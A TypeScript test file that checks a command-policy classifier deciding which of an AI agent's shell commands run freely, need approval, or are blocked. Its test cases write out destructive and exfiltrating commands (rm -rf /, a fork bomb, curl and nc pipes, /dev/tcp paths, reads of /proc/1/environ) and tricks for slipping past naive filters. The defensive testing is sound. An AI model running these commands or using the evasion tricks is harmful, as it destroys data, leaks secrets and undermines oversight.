// @vitest-environment node
//
// The command policy: which shell commands run without a yes, which wait for
// one, and which never run. A command is read whole. If any part of it is not
// plainly on the allow list, the whole command asks.
import { describe, expect, it } from 'vitest'
import { rng } from '../../../conformance/gen.ts'
import { HIDDEN_WRITES } from '../../../conformance/suites/tool-checks.ts'
import { applyPatch, loadFixturePolicy } from '../../../conformance/scenarios/load.ts'
import { decide } from '../decide.ts'
import { toPrincipal, toRoom } from '../normalise.ts'
import { withHash } from '../policy/canonical.ts'
import { validatePolicy } from '../policy/validate.ts'
import {
  classifyCommand, commandListsProblems, DEFAULT_COMMANDS, NEVER_ALLOWED, type CommandLists,
} from '../tools/command-policy.ts'

const verdict = (command: string, lists: CommandLists = DEFAULT_COMMANDS) => classifyCommand(command, lists).verdict

describe('commands that run without asking', () => {
  it.each([
    'ls', 'ls -la', 'ls -la notes', 'cat notes.txt', 'head -n 5 notes.txt', 'tail -n 20 log.txt',
    'grep -rn TODO .', 'grep -i "two words" notes.txt', "grep 'a|b' notes.txt", 'wc -l notes.txt',
    'uname -a', 'date', 'date +%Y-%m-%d', 'echo hello', 'echo "a; rm -rf /"', 'pwd',
    'find . -name x.txt', 'find . -type f -newer a.txt', 'ls | grep x', 'ls && pwd', 'ls; pwd', 'ls || echo none',
    'cat a.txt 2>/dev/null', 'ls 2>&1 | head', 'grep x < notes.txt', 'sort notes.txt', 'sort -rn notes.txt | uniq -c',
    "cat 'a file.txt'", 'cat a\\ file.txt', '\\ls', "'ls' -la",
  ])('[U:command-policy] %s', (command) => {
    const d = classifyCommand(command, DEFAULT_COMMANDS)
    expect(d.verdict, d.rule).toBe('allow')
    expect(d.rule.startsWith('allow:')).toBe(true)
  })

  it('[U:command-policy] the rule names the listed commands that decided, and nothing the agent wrote', () => {
    expect(classifyCommand('ls -la | grep secret-word', DEFAULT_COMMANDS).rule).toBe('allow:ls,grep')
  })
})

describe('commands that wait for a yes', () => {
  it.each([
    // a write hidden in a redirection
    ['cat x > /tmp/y', 'ask:redirect'], ['echo hi > notes.txt', 'ask:redirect'], ['ls >> out.txt', 'ask:redirect'],
    ['ls &> out.txt', 'ask:redirect'], ['ls 2> err.txt', 'ask:redirect'], ['ls >| out.txt', 'ask:redirect'],
    ['cat <> x', 'ask:redirect'], ['ls >&out.txt', 'ask:redirect'],
    // substitutions and expansions of every kind
    ['ls $(rm x)', 'ask:expansion'], ['ls `rm x`', 'ask:expansion'], ['echo "$(rm x)"', 'ask:expansion'], ['echo "`rm x`"', 'ask:expansion'],
    ['echo $HOME', 'ask:expansion'], ['echo ${HOME}', 'ask:expansion'], ["echo $'\\x41'", 'ask:expansion'], ['cat $IFS/etc', 'ask:expansion'],
    ['cat <(ls)', 'ask:unparsed'], ['(ls)', 'ask:unparsed'], ['{ ls; }', 'ask:unparsed'], ['ls {a,b}', 'ask:unparsed'],
    ['cat <<EOF\nx\nEOF', 'ask:redirect'], ['cat <<< hello', 'ask:redirect'],
    // wrappers, prefixes and things that run other things
    ['env X=1 ls', 'ask:never-allowed'], ['X=1 ls', 'ask:env-prefix'], ['command ls', 'ask:never-allowed'], ['exec ls', 'ask:never-allowed'],
    ['xargs ls', 'ask:never-allowed'], ['sh run.sh', 'ask:never-allowed'], ['bash -c ls', 'ask:never-allowed'], ['. ./run.sh', 'ask:never-allowed'],
    ['source run.sh', 'ask:never-allowed'], ['python3 -c "print(1)"', 'ask:never-allowed'], ['nohup ls', 'ask:never-allowed'], ['timeout 5 ls', 'ask:never-allowed'],
    ['find . -exec rm {} ;', 'ask:unparsed'], ['find . -exec ls x \\;', 'ask:args'], ['find . -delete', 'ask:args'], ['find . -execdir ls ;', 'ask:args'], ['find . -fprint out', 'ask:args'], ['find . -ok rm ;', 'ask:args'],
    ['date -s 2020-01-01', 'ask:args'], ['file -C -m x', 'ask:args'], ['find . -name x -delete', 'ask:args'], ['date --set=2020-01-01', 'ask:args'], ['sort -o out.txt notes.txt', 'ask:args'], ['sort --output=o x', 'ask:args'],
    ['sort --compress-program=sh x', 'ask:args'], ['uniq in.txt out.txt', 'ask:args'],
    // things nobody listed, and absolute paths to listed things
    ['touch x', 'ask:unlisted'], ['mkdir d', 'ask:unlisted'], ['/bin/ls', 'ask:path'], ['./ls', 'ask:path'], ['rm notes.txt', 'ask:unlisted'],
    // background, comments, globs, odd characters
    ['ls &', 'ask:background'], ['ls # rm -rf /', 'ask:comment'], ['cat *.txt', 'ask:glob'], ['ls ?', 'ask:glob'], ['ls [ab]', 'ask:glob'],
    ['ls ~', 'ask:glob'], ['! ls', 'ask:unparsed'], ['ls -la', 'ask:unusual-character'], ['ls\r', 'ask:unusual-character'], ['l​s', 'ask:unusual-character'],
    ['ｌｓ', 'ask:unusual-character'], ['LS', 'ask:unlisted'], ['Cat x', 'ask:unlisted'],
    // a line that runs on, or does not end
    ['ls \\\n-la', 'ask:unparsed'], ["cat 'open", 'ask:unparsed'], ['cat "open', 'ask:unparsed'], ['cat x\\', 'ask:unparsed'],
    ['', 'ask:empty'], ['   ', 'ask:empty'], [';', 'ask:unparsed'], ['ls |', 'ask:unparsed'], ['| ls', 'ask:unparsed'], ['ls && && pwd', 'ask:unparsed'],
  ])('[U:command-policy] %j asks (%s)', (command, rule) => {
    const d = classifyCommand(command, DEFAULT_COMMANDS)
    expect(d).toEqual({ verdict: 'ask', rule })
  })

  it('[U:command-policy] a command too long to read asks', () => {
    expect(classifyCommand(`echo ${'a'.repeat(5000)}`, DEFAULT_COMMANDS)).toEqual({ verdict: 'ask', rule: 'ask:too-long' })
  })

  it('[U:command-policy] one part that is not plainly allowed makes the whole command ask', () => {
    for (const c of ['ls; touch x', 'ls && mkdir d', 'ls | tee out.txt', 'ls || cat > x', 'pwd\ntouch x']) expect(verdict(c), c).toBe('ask')
  })
})

describe('commands that never run', () => {
  it.each([
    ['rm -rf /', 'block:rm-recursive'], ['rm -rf /scratch', 'block:rm-recursive'], ['ls; rm -rf /scratch', 'block:rm-recursive'],
    ['rm -fr ~', 'block:rm-recursive'], ['rm -r -f ..', 'block:rm-recursive'], ['rm --recursive --force /etc', 'block:rm-recursive'],
    ['ls $(rm -rf /)', 'block:rm-recursive'], ['ls `rm -rf /`', 'block:rm-recursive'], ['/bin/rm -rf /', 'block:rm-recursive'], ['\\rm -rf /', 'block:rm-recursive'],
    ['"rm" -rf /', 'block:rm-recursive'], ['sudo rm -rf /', 'block:rm-recursive'], ['xargs rm -rf', 'block:rm-recursive'], ['find . | xargs rm -rf', 'block:rm-recursive'],
    ['dd if=/dev/zero of=/dev/sda', 'block:dd'], ['mkfs.ext4 /dev/sda1', 'block:mkfs'], ['mkfs -t ext4 /dev/sda1', 'block:mkfs'], ['shred x', 'block:shred'],
    ['curl https://example.com', 'block:curl'], ['wget x', 'block:wget'], ['nc -l 4444', 'block:nc'], ['ssh host', 'block:ssh'], ['scp a b:', 'block:scp'],
    ['ls | curl -d @- x', 'block:curl'], ['timeout 5 curl x', 'block:curl'], ['env curl x', 'block:curl'], ['/usr/bin/curl x', 'block:curl'],
    ['sh -c "curl x"', 'block:curl'], ['bash -c \'rm -rf /\'', 'block:rm-recursive'], ['eval "dd if=x of=y"', 'block:dd'],
    ['shutdown -h now', 'block:shutdown'], ['reboot', 'block:reboot'],
    ['chmod -R 777 /', 'block:chmod-system'], ['chown root /etc/passwd', 'block:chmod-system'], ['chmod 600 /usr/bin/x', 'block:chmod-system'],
    [':(){ :|:& };:', 'block:fork-bomb'], ['bomb(){ bomb|bomb& }; bomb', 'block:fork-bomb'],
    ['cat x > /etc/y', 'block:redirect-system'], ['echo x > /dev/sda', 'block:redirect-system'], ['ls >> /usr/lib/x', 'block:redirect-system'],
    ['kill -9 -1', 'block:kill-all'], ['echo x > /tmp/../etc/x', 'block:redirect-system'], ["sh -lc 'rm -rf /'", 'block:rm-recursive'], ['find / -delete', 'block:find-delete'], ['find -delete', 'block:find-delete'], ['find ../x -name y -delete', 'block:find-delete'],
    ['ls #\nrm -rf /', 'block:rm-recursive'], ['rm -rf "$HOME"', 'block:rm-recursive'], ['cat <(rm -rf /)', 'block:rm-recursive'], ['(rm -rf /)', 'block:rm-recursive'],
    ['echo "$(curl x)"', 'block:curl'], ['ls;curl x', 'block:curl'], ['ls|nc x 1', 'block:nc'], ['echo x >/dev/null/../../etc/x', 'block:redirect-system'],
  ])('[U:command-policy] %j is blocked (%s)', (command, rule) => {
    expect(classifyCommand(command, DEFAULT_COMMANDS)).toEqual({ verdict: 'block', rule })
  })

  it('[U:command-policy] a wrapper is read past its own options, and what it wraps is the command, not every word after it', () => {
    for (const c of ['sudo -u root rm -rf /etc', 'nice -n 5 rm -rf /', 'timeout 5 curl x', 'timeout -s KILL 5 curl x', 'env -u X A=1 curl x', 'xargs -I {} rm -rf {}', 'su -c "rm -rf /"', "env -S 'curl x'", 'command -- curl x']) {
      expect(verdict(c), c).toBe('block')
    }
    // The word curl as something grep looks for is not curl.
    for (const c of ['find . | xargs grep curl', 'xargs -n 1 grep dd', 'sudo grep ssh /etc/x', 'timeout 5 grep wget notes']) expect(classifyCommand(c, DEFAULT_COMMANDS), c).toEqual({ verdict: 'ask', rule: 'ask:never-allowed' })
  })

  it('[U:command-policy] a recursive delete inside the scratch folder asks rather than being blocked', () => {
    expect(verdict('rm -rf build')).toBe('ask')
    expect(verdict('rm -rf ./build')).toBe('ask')
    expect(verdict('rm build')).toBe('ask')
  })
})

describe('what an operator can change', () => {
  it('[U:command-policy] a name added to the allow list runs; one added to the block list never does, even if also allowed', () => {
    const lists: CommandLists = { allow: [...DEFAULT_COMMANDS.allow, 'touch'], block: [...DEFAULT_COMMANDS.block, 'ls'] }
    expect(classifyCommand('touch x', lists)).toEqual({ verdict: 'allow', rule: 'allow:touch' })
    expect(classifyCommand('ls', { ...lists, allow: [...lists.allow, 'ls'] })).toEqual({ verdict: 'block', rule: 'block:ls' })
  })

  it('[U:command-policy] an empty allow list asks for everything, and the built-in blocks still hold', () => {
    const lists: CommandLists = { allow: [], block: [] }
    expect(classifyCommand('ls', lists)).toEqual({ verdict: 'ask', rule: 'ask:unlisted' })
    expect(classifyCommand('rm -rf /', lists)).toEqual({ verdict: 'block', rule: 'block:rm-recursive' })
    expect(classifyCommand(':(){ :|:& };:', lists).verdict).toBe('block')
  })

  it('[U:command-policy] a shell, an interpreter or a wrapper can never be allowed, so a yes is never skipped for a script', () => {
    for (const name of ['sh', 'bash', 'source', '.', 'eval', 'env', 'xargs', 'python3', 'node']) {
      expect(NEVER_ALLOWED).toContain(name)
      expect(classifyCommand(`${name} run.sh`, { allow: [name], block: [] }).verdict, name).toBe('ask')
      expect(commandListsProblems({ allow: [name], block: [] }).length, name).toBeGreaterThan(0)
    }
  })

  it('[U:command-policy] the lists hold plain command names only', () => {
    expect(commandListsProblems(DEFAULT_COMMANDS)).toEqual([])
    for (const bad of ['', 'rm -rf', '/bin/ls', 'a;b', 'x'.repeat(40), 'ls\n', 'ＬＳ']) {
      expect(commandListsProblems({ allow: [bad], block: [] }).length, JSON.stringify(bad)).toBeGreaterThan(0)
    }
    expect(commandListsProblems({ allow: 'ls', block: [] } as never).length).toBeGreaterThan(0)
  })
})

/** The characters of a command outside any quotes, and those inside double quotes, the way a shell reads them. */
function split(command: string): { outside: string; inDouble: string } {
  let outside = ''
  let inDouble = ''
  for (let i = 0; i < command.length; i++) {
    const c = command[i]
    if (c === '\\') { i++; continue }
    if (c === "'") { const end = command.indexOf("'", i + 1); if (end < 0) break; i = end; continue }
    if (c === '"') {
      for (i++; i < command.length && command[i] !== '"'; i++) { if (command[i] === '\\') i++; else inDouble += command[i] }
      continue
    }
    outside += c
  }
  return { outside, inDouble }
}

describe('the classifier never says allow for something it did not read', () => {
  // A random command built from the pieces that change what a shell does. Whatever comes out, if
  // it holds one of these pieces unquoted, the verdict is not allow.
  const pieces = ['ls', 'cat', 'x', '-la', ' ', ' ', ';', '|', '&&', '>', '<', '$', '`', '(', ')', '{', '}', '*', '~', '#', '\\', "'", '"', '\n', '&', '=', '!', 'rm', '-rf', '/']
  it('[U:command-policy] 3000 random commands: allow only when every word is plain and the first is listed', () => {
    const r = rng(20261117)
    let allowed = 0
    for (let i = 0; i < 3000; i++) {
      const n = 1 + r.int(8)
      const command = Array.from({ length: n }, () => r.pick(pieces)).join('')
      const d = classifyCommand(command, DEFAULT_COMMANDS)
      if (d.verdict !== 'allow') continue
      allowed++
      // Allowed means: outside quotes, only plain words, spaces and the joining operators. Nothing that
      // writes, expands, groups or runs in the background, and nothing inside double quotes that expands.
      const { outside, inDouble } = split(command)
      expect(outside, command).toMatch(/^[A-Za-z0-9 \n./_|;&-]*$/)
      expect(outside, command).not.toMatch(/(^|[^&|])&($|[^&])/)
      expect(inDouble, command).not.toMatch(/[$`]/)
    }
    expect(allowed).toBeGreaterThan(20) // a control: the generator does reach allow
  })
})

describe('the conformance check K1 has teeth', () => {
  // A reader that looks at the first word only: the mistake the command policy is there to avoid.
  const firstWord = (command: string): 'allow' | 'ask' => (DEFAULT_COMMANDS.allow.includes(command.trim().split(/\s+/)[0]) ? 'allow' : 'ask')

  it('[U:command-policy] a first-word reader lets most of the hidden writes through, and the real one lets none', () => {
    const commands = HIDDEN_WRITES.map((make) => make('/scratch/k1.out'))
    expect(commands.filter((c) => firstWord(c) === 'allow').length).toBeGreaterThanOrEqual(commands.length - 3)
    for (const c of commands) expect(classifyCommand(c, DEFAULT_COMMANDS).verdict, c).toBe('ask')
  })
})

describe('the command policy in the record', () => {
  const policy = (commands: unknown) => withHash(applyPatch(loadFixturePolicy('policy-team.json'), { 'tools.allow': [], 'tools.ask': ['shell', 'file_read'], 'tools.commands': commands }))
  const tool = (toolClass: string, command: string) => ({ kind: 'tool' as const, surface: 'fake' as const, room: toRoom('r-general'), actor: toPrincipal('u-alice'), toolClass: toolClass as never, toolName: 't', argsDigest: '', command })

  it('[U:command-policy] is refused when its lists are not plain names, or allow a shell', () => {
    expect(validatePolicy(policy(DEFAULT_COMMANDS), { testing: true })).toEqual([])
    expect(validatePolicy(policy({ allow: ['sh'], block: [] }), { testing: true }).join()).toMatch(/tools\.commands\.allow\[0\]/)
    expect(validatePolicy(policy({ allow: ['ls'] }), { testing: true }).join()).toMatch(/tools\.commands\.block/)
    expect(decide(policy({ allow: ['sh'], block: [] }), tool('shell', 'ls'), {})).toMatchObject({ verdict: 'deny', rule: 'ctl.valid' })
  })

  it('[U:command-policy] reads only a shell call: a command on another class of tool changes nothing', () => {
    expect(decide(policy(DEFAULT_COMMANDS), tool('shell', 'ls'), {})).toMatchObject({ verdict: 'allow', rule: 'tools.commands' })
    expect(decide(policy(DEFAULT_COMMANDS), tool('file_read', 'ls'), {})).toMatchObject({ verdict: 'ask', rule: 'priv.approval' })
    expect(decide(policy(DEFAULT_COMMANDS), tool('file_read', 'dd'), {})).toMatchObject({ verdict: 'ask', rule: 'priv.approval' })
  })
})

describe('an allowed command stays in the scratch folder', () => {
  // The cell holds more than the scratch folder: its own token in /proc/1/environ, other
  // conversations' transcripts beside the scratch folder, the harness's settings. A file tool
  // cannot reach them. A command that runs with no yes must not either.
  it.each([
    'cat /proc/1/environ', 'cat /proc/self/environ', 'grep -a BRAIN /proc/1/environ', 'cat /proc/self/mountinfo',
    'ls /tmp/smlab/sessions', 'cat /tmp/smlab/sessions/abc/1.jsonl', 'find / -name models.json', 'grep -r x /',
    'ls ..', 'cat ../sessions/x', 'find .. -name x', 'cat a/../../x', 'ls -la ./..',
    'grep -f/proc/1/environ x', 'grep --file=/proc/1/environ x', 'file -m /proc/1/environ x', 'date -f /proc/1/environ',
    'cat < /proc/1/environ', 'grep x </etc/passwd', 'cat /dev/zero', 'head -c 9 /dev/urandom', 'du /', 'ls -R /',
    'sort --files0-from=list', 'wc --files0-from list', 'du --files0-from=list',
  ])('[U:command-policy] %j asks', (command) => {
    expect(classifyCommand(command, DEFAULT_COMMANDS).verdict).toBe('ask')
  })

  it('[U:command-policy] a path inside the scratch folder, and a relative name with a slash, still run', () => {
    for (const c of ['cat notes/a.txt', 'grep -rn x ./src', 'ls -la .', 'find . -name "*.md" -o -name x', 'diff a/x b/x', 'cat a.txt 2>/dev/null', 'grep -e a/b x'.replace('a/b', 'ab')]) {
      expect(classifyCommand(c, DEFAULT_COMMANDS).verdict, c).toBe('allow')
    }
  })
})

describe('an allowed command cannot run without end', () => {
  it.each(['seq inf', 'seq 1 99999999999', 'seq 1e9', 'seq -f %g 1 9', 'seq 1000000'])('[U:command-policy] %j asks', (command) => {
    expect(classifyCommand(command, DEFAULT_COMMANDS).verdict).toBe('ask')
  })
  it('[U:command-policy] a short count still runs', () => {
    expect(classifyCommand('seq 1 10', DEFAULT_COMMANDS).verdict).toBe('allow')
    expect(classifyCommand('seq 5', DEFAULT_COMMANDS).verdict).toBe('allow')
  })
})

describe('the shorter spellings of a long option are the long option', () => {
  it.each(['date --s=2020-01-01', 'date --se=2020-01-01', 'date --set 2020-01-01'])('[U:command-policy] %j asks', (command) => {
    expect(classifyCommand(command, DEFAULT_COMMANDS)).toEqual({ verdict: 'ask', rule: 'ask:args' })
  })
})

describe('bash\'s own network paths never run', () => {
  it.each(['cat < /dev/tcp/door/7777', 'echo x > /dev/tcp/10.0.0.1/80', 'ls 3</dev/udp/door/53', 'cat </dev/tcp//door/1'])('[U:command-policy] %j is blocked', (command) => {
    expect(classifyCommand(command, DEFAULT_COMMANDS)).toEqual({ verdict: 'block', rule: 'block:network-path' })
  })
})
